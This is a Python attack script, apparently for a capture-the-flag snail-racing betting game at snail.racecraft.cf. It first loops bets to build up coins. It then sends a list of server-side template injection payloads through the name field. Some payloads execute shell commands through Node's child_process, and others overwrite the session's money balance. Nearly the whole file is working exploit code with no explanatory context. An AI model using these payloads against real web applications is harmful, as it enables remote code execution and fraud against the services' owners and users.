import requests
import time
import json

def get_money():
    r = requests.get('http://snail.racecraft.cf/check')
    return r.json()['money']

def place_bet(winner, amount):
    r = requests.patch(f'http://snail.racecraft.cf/bet/{winner}', 
                      data={'bet': str(amount)})
    return r.json()

def get_state():
    r = requests.get('http://snail.racecraft.cf/check')
    return r.json()

def wait_for_race():
    while True:
        state = get_state()
        if state['start'] == '0' or int(state['start']) < int(time.time()):
            break
        time.sleep(1)

def set_name(payload):
    r = requests.patch('http://snail.racecraft.cf/name', 
                      data={'name': payload})
    return r.json()

def main():
    # First get 250,000 coins
    print("Getting coins...")

    while get_money() < 250000:
        state = get_state()
        if state['start'] == '0' or int(state['start']) < int(time.time()):
            continue

        # Place max bet on side with better odds
        money = state['money']
        bet = min(money, 1000000)

        if float(state['a']) > float(state['b']):
            print(f"Betting {bet} on A")
            place_bet(0, bet)
        else:
            print(f"Betting {bet} on B")
            place_bet(1, bet)

        wait_for_race()

    print("Got enough coins!")

    # Now try template injection payloads
    payloads = [
        "${process.mainModule.require('child_process').execSync('id')}",
        "${this.session={money:999999999}}",
        "${(()=>{this.money=999999999})()} ",
        "${this.session.money=999999999}",
        "${global.process.mainModule.require('child_process').execSync('id')}",
        "${constructor.constructor('return process')().mainModule.require('child_process').execSync('id')}",
        "${this.constructor.constructor('return this')().session={money:999999999}}"
    ]

    for payload in payloads:
        print(f"Trying payload: {payload}")
        result = set_name(payload)
        print(f"Result: {result}")
        money = get_money()
        print(f"Money after payload: {money}")
        time.sleep(2)  # Wait between attempts

if __name__ == "__main__":
    main()

